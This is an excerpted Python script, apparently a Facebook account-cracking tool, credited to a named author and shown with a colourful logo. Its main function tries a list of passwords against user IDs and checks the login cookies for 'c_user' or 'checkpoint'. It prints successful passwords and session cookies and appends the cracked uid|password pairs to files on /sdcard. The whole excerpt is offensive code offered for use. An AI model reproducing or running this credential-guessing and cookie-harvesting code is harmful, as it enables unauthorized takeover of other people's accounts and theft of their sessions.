# NAME : MR JANER
# GITHUB :Jaber-py
# FB GROUP :https://facebook.com/groups/1182201165705121/
# FB ID : Jaber Ahmed 
...
# LOGO
logo = ("""
\033[1;31m ____   __    ____  ____  ____ 
\033[1;32m  (_  _) /__\  (  _ \( ___)(  _ \
\033[1;33m .-_)(  /(__)\  ) _ < )__)  )   /
\033[1;34m \____)(__)(__)(____/(____)(_)\_)
...
def sexy():
    ...
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(' [😁] OKJaber-OK.txt')
    print(' [😁] CPJaber-OK.txt')
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
def alhaj(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;32m[JaberKING]\033[1;36m😍[%s/%s]😁\033[1;32m[OK-%s]\033[1;35m \r'%(loop,tl,len(oks))),
            sys.stdout.flush()
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[1;33m[\033[1;32mJaberOK 😝\033[1;33m]\033[1;92m {uid}\033[1;95m|\033[1;92m {ps} ")
                print(f"\033[1;92m[😜] COOKIE :\033[1;95m {coki}")
                open('/sdcard/JaberOK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;33m[\033[1;32mJaberCP\033[1;33m]\033[1;91m {uid}|{ps}")
                open('/sdcard/JaberCP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
